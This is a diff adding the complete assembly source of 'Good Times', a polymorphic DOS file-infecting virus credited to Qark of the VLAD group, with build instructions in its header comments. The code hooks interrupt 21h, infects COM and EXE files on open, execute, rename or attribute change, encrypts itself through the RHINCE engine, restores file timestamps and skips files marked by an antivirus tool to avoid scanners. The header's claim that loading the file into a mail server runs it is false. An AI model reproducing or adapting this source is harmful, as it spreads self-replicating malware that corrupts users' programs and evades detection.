@@ -1,0 +1,480 @@
+
+;
+;                        Good Times
+;                           by 
+;                        Qark [VLAD]
+;
+; Infects COM files between 60000 and 1024 bytes in size.  It traverses the
+; file by following any jumps/calls at the immediate start, and writes a call
+; to the main virus body there.
+; Infects EXE files in the standard manner.  Won't infect Win EXE files,
+; EXE files without FFFF in the maxmem field and EXE files that use overlays.
+;
+; It is polymorphic because it uses RHINCE to generate random length
+; decryptors.
+;
+; Also...
+;       The act of loading the file into a mail server's ASCII
+;       buffer causes the "Good Times" mainline program to
+;       initialize and execute.
+;
+; Remember to email all your friends, warning them about Good Times!
+;
+; To assemble the virus, you will require a86, and the source to RHINCE.
+; The RHINCE source needs to be named 'rhince.inc' and the label 'polycode'
+; must be removed from it.
+;
+
+        org     0
+
+        mov     bp,sp
+
+        call    next                    ;IP onto the stack
+
+next:
+        mov     si,[bp-2]               ;SI=delta+offset next
+        sub     si,offset next          ;SI=delta
+        lea     ax,word ptr [si+offset next_ret]        ;AX=offset next_ret
+        mov     [bp-2],ax               ;We will RET to next_ret now.
+        ret
+next_ret:
+        cld
+        push    ds
+
+        mov     ax,3d76h
+        int     21h
+        cmp     ax,763dh
+        je      resident
+
+        mov     ax,ds
+        dec     ax
+        mov     ds,ax
+
+        xor     di,di
+
+        cmp     byte ptr [di],'Y'
+        jbe     resident
+        
+        sub     word ptr [di+3],(offset stack_end /16) + 1
+        sub     word ptr [di+12h],(offset stack_end /16) + 1
+        mov     ax,word ptr [di+12h]
+        mov     es,ax
+        
+        push    cs
+        pop     ds
+        mov     cx,offset end_virus
+        push    si
+        rep     movsb
+
+        mov     ds,cx                   ;CX=0 from the rep movsb
+
+        mov     si,21h*4
+        mov     di,offset i21
+        movsw
+        movsw
+        mov     word ptr [si-4],offset int21handler
+        mov     word ptr [si-2],es
+        
+        pop     si
+resident:
+        pop     ds
+
+        push    ds
+        pop     es
+
+        cmp     byte ptr cs:[si+offset com_exe],1
+        je      exe_exit
+        
+        db      0bfh                    ;MOV DI,xxxx
+        ret_point       dw      100h
+
+        sub     word ptr [bp],3         ;Convert the original call.
+        add     si,offset old4
+        movsw
+        movsw
+        ret
+
+exe_exit:
+        mov     ax,ds                   ;AX=DS=PSP
+        add     ax,10h                  ;Point to start of executable code.
+
+        add     word ptr cs:[si+offset jump+2],ax       ;Fix CS
+
+        ;Restore SS:SP
+        mov     sp,word ptr cs:[si+offset orig_sp]
+        add     ax,word ptr cs:[si+offset orig_ss]
+        mov     ss,ax
+
+        jmp     $+2                     ;Clear prefetch.
+        db      0eah                    ;Far jump
+        jump    dd      0               ;CS:IP from EXE header.
+
+        orig_sp dw      0
+        orig_ss dw      0
+
+com_exe db      0               ;COM = 0  EXE = 1
+
+        db      ' Good Times by Qark/VLAD '
+
+int21handler:
+        push    ax
+        xchg    ah,al
+        cmp     al,3dh
+        je      res_test
+        cmp     al,43h
+        je      infect
+        cmp     al,4bh
+        je      infect
+        cmp     al,56h
+        je      infect
+pop_exit:
+        pop     ax
+jend:
+        db      0eah                    ;JMP orig21
+        i21     dd      0
+res_test:
+        cmp     ah,76h                  ;Check for our little res test.
+        jne     infect
+        inc     sp                      ;AX is on the stack.
+        inc     sp
+        iret
+
+infect:
+        push    bx
+        push    cx
+        push    dx
+        push    si
+        push    di
+        push    bp
+        push    ds
+        push    es
+
+        mov     si,dx
+        cld
+find_dot:
+        lodsb
+        cmp     al,'.'
+        jne     find_dot
+        lodsb                   ;Load AL with the first letter of the ext.
+
+        ;I only check the first letter of the file name, but that doesn't
+        ;concern me because I check for the MZ/ZM or look for a E9 otherwise.
+
+        cmp     al,'C'
+        je      ok_name
+        cmp     al,'E'
+        je      ok_name
+        cmp     al,'c'
+        je      ok_name
+        cmp     al,'e'
+        je      ok_name
+iipop_exit:
+        jmp     ipop_exit
+ok_name:
+
+        ;call test_name
+
+        mov     ax,3d02h
+        call    int21h
+        jc      iipop_exit
+        
+        xchg    bx,ax                   ;File handle into BX
+        
+        push    cs
+        pop     ds                      ;DS=CS
+        push    cs
+        pop     es                      ;ES=CS
+        
+        mov     ah,3fh
+        mov     dx,offset old4
+        mov     si,dx                   ;SI=Offset end_virus
+        mov     cx,1ch
+        call    int21h
+
+        mov     ax,word ptr [si]
+
+        or      ax,2020h                ;Convert to lowercase for anti
+                                        ;heuristics.
+        cmp     ax,'mz'
+        je      exe_infect
+        cmp     ax,'zm'
+        je      exe_infect
+
+        jmp     com_infect
+eclose:
+        jmp     close_exit
+exe_infect:
+
+        cmp     word ptr [si+1ah],0     ;Don't infect overlays.
+        jne     eclose
+        cmp     word ptr [si+18h],40h   ;Don't infect windows executables.
+        jae     eclose
+                                ;If total memory isn't allocated, don't
+        cmp     word ptr [si+0ch],0ffffh        ;infect.
+        jne     eclose
+
+        cmp     word ptr [si+12h],'BV'  ;When 'Virus Buster' generically
+        je      eclose                  ;restores EXE files, it leaves this
+                                        ;signature in the checksum, which
+                                        ;is handy for us because it means:
+                                        ;A) we don't infect the files of
+                                        ;a person who uses scanners, and
+                                        ;B) AVers can't use it as part of
+                                        ;a signature.
+
+
+        mov     byte ptr com_exe,1      ;Signal EXE file.
+
+        mov     ax,word ptr [si+0eh]
+        mov     word ptr orig_ss,ax
+        mov     ax,word ptr [si+10h]
+        mov     word ptr orig_sp,ax     ;Saved the SS:SP
+
+        push    si
+        add     si,14h
+        mov     di,offset jump
+        movsw
+        movsw                           ;Saved the CS:IP
+        pop     si
+        
+        call    lseek_end
+        ;File length is in DX:AX
+        mov     cx,16
+        div     cx                      ;Paragraphs.
+
+        sub     ax,word ptr [si+8]      ;Subtract header size.
+
+        mov     word ptr [si+14h],dx    ;IP into header
+        mov     word ptr [si+16h],ax    ;CS into header
+        push    dx
+        add     dx,offset stack_end
+
+        dec     ax
+        mov     word ptr [si+0eh],ax    ;We'll make SS=CS-1
+        mov     word ptr [si+10h],dx    ;SP=IP+stack_end
+        and     dx,0fffeh
+
+        pop     bp
+        mov     cx,offset end_virus
+        xor     dx,dx
+        push    bx
+        push    si
+        call    mut_eng
+        pop     si
+        pop     bx
+        
+        call    save_time
+        
+        mov     ah,40h
+        call    int21h
+        jc      close_exit
+        
+        call    lseek_end
+        ;File length into DX:AX
+
+        mov     cx,512                  ;Page size.
+        div     cx
+
+        or      dx,dx
+        jz      no_page_fix
+        inc     ax                      ;Add the last partial page.
+no_page_fix:
+        mov     word ptr [si+4],ax      ;Number of pages
+        mov     word ptr [si+2],dx      ;Partial page.
+
+        call    lseek_start
+
+        mov     word ptr [si+12h],'BV'  ;Our marker.
+
+        mov     ah,40h                  ;Write header.
+        mov     dx,si
+        mov     cx,1ch
+        call    int21h
+
+        call    restore_time
+
+close_exit:
+        mov     ah,3eh
+        call    int21h
+
+ipop_exit:
+        pop     es
+        pop     ds
+        pop     bp
+        pop     di
+        pop     si
+        pop     dx
+        pop     cx
+        pop     bx
+
+        jmp     pop_exit
+
+com_infect:
+
+        mov     byte ptr com_exe,0      ;Signal COM infection.
+        mov     word ptr filepointer,0  ;Point to start of the file.
+        
+recurse_entry:
+
+        mov     al,byte ptr [si]
+        
+        cmp     al,0e9h                 ;JMP instruction
+        je      chk_entry
+        cmp     al,0e8h                 ;CALL instruction
+        je      chk_entry
+        cmp     al,0ebh                 ;JMP 'short' instruction
+        jne     write_virus
+
+        mov     al,byte ptr [si+1]
+        add     al,2
+        cbw
+        jmp     short smalljmp
+chk_entry:
+        mov     ax,word ptr [si+1]      ;Jump distance.
+        add     ax,3
+smalljmp:
+        add     ax,word ptr filepointer
+        mov     word ptr filepointer,ax
+        
+        push    ax
+
+        add     ax,100h                 ;Calculate where to return stuff to.
+        mov     word ptr ret_point,ax
+
+        pop     dx
+        mov     al,0
+        push    dx
+        call    lseek
+
+        mov     dx,offset old4          ;Read the original bytes there.
+        mov     cx,4
+        mov     ah,3fh
+        call    int21h
+
+        pop     dx
+        mov     al,0
+        call    lseek                   ;Lseek back there.
+
+        cmp     byte ptr old4 + 3,'H'   ;Check if its already infected.
+        jne     recurse_entry
+        jmp     closejmp                ;Must be infected...
+
+write_virus:
+
+        call    lseek_end
+        or      dx,dx
+        jnz     close_exit
+        cmp     ax,60000
+        ja      close_exit
+        cmp     ax,1024
+        jb      close_exit
+
+        xchg    dx,ax                   ;File size into DX
+
+        mov     ax,word ptr filepointer ;Where the jump goes to.
+        add     ax,3                    ;Jumps are 3 bytes.
+        sub     dx,ax                   ;Calculate new jump offset.
+        mov     word ptr new_jump+1,dx  ;Move it.
+        sub     ax,3                    ;This is the physical disk position.
+
+        mov     dx,ax
+        mov     al,0
+        call    lseek                   ;Lseek to the jump entry.
+
+        call    save_time
+        
+        mov     cx,4                    ;Write the new jump. (a call :)
+        mov     dx,offset new_jump
+        mov     ah,40h
+        call    int21h
+        jc      closejmp
+        
+        call    lseek_end
+        
+        add     ax,100h
+        mov     cx,offset end_virus
+        mov     bp,ax
+        xor     dx,dx
+        push    bx
+        call    mut_eng
+        pop     bx
+
+        mov     ah,40h
+        ;mov     cx,offset end_virus
+        ;xor     dx,dx
+        call    int21h
+
+        call    restore_time
+
+closejmp:        
+        jmp     close_exit
+
+;----------------------------------------
+int21h:                         ;Simulated int 21 call.
+        pushf
+        call    dword ptr cs:i21
+        ret
+;----------------------------------------
+Lseek_End:                      ;Lseek to the end.
+        mov     al,2
+        jmp     short lsk
+Lseek_Start:                    ;Lseek to the start.
+        mov     al,0
+lsk:
+        xor     dx,dx
+Lseek:                          ;General Lseek.
+        xor     cx,cx
+        mov     ah,42h
+        call    int21h
+        ret
+;----------------------------------------
+Save_Time:
+        push    ax
+        push    cx
+        push    dx
+
+        mov     ax,5700h
+        call    int21h
+
+        mov     word ptr time,cx
+        mov     word ptr date,dx
+
+        pop     dx
+        pop     cx
+        pop     ax
+        ret
+;----------------------------------------
+Restore_Time:
+        push    ax
+        push    cx
+        push    dx
+
+        db      0bah            ;MOV DX,xxxx
+        date    dw      0
+
+        db      0b9h            ;MOV CX,xxxx
+        time    dw      0
+
+        mov     ax,5701h
+        call    int21h
+
+        pop     dx
+        pop     cx
+        pop     ax
+        ret
+;----------------------------------------
+
+        include rhince.inc              ;Rhince's polymorphic engine.
+
+new_jump        db      0e8h,0,0,'H'            ;Actually its a CALL.
+filepointer     dw      0
+old4    db      0cdh,20h,0,0
+end_virus:
+        db      1ch dup (0)
+polycode:                               ;Rhince needs this here.
+        db      500 dup (0)             ;Make some room for rhince.
+        dup_size        equ     offset end_virus
+        db      dup_size dup (0)
+stack_end:
+
+
